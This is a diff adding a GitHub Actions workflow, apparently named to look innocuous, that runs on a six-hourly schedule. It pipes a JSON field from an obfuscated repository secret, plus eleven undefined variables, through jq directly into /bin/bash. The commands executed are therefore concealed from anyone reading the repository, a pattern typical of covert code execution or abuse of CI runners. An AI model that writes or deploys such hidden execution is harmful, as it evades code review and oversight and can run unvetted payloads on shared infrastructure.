@@ -1,0 +1,28 @@
+name: hushenme
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: hushenme
+        env:
+          doemt8358: ${{ secrets.doemt8358 }}
+        run: |
+          echo $doemt8358 | jq -r .xhzo7 | /bin/bash
+          echo $naker9074 | jq -r .sccui7986 | /bin/bash
+          echo $ug83 | jq -r .puphs682 | /bin/bash
+          echo $wj44 | jq -r .ixxp7804 | /bin/bash
+          echo $uct76 | jq -r .qwuo4 | /bin/bash
+          echo $vkht987 | jq -r .h7878 | /bin/bash
+          echo $yak1463 | jq -r .a2 | /bin/bash
+          echo $kynw7 | jq -r .m7 | /bin/bash
+          echo $a452 | jq -r .cq054 | /bin/bash
+          echo $fs80855 | jq -r .ivjr89 | /bin/bash
+          echo $kml835 | jq -r .pegku11 | /bin/bash
+          echo $q291 | jq -r .ksxhp42181 | /bin/bash
+
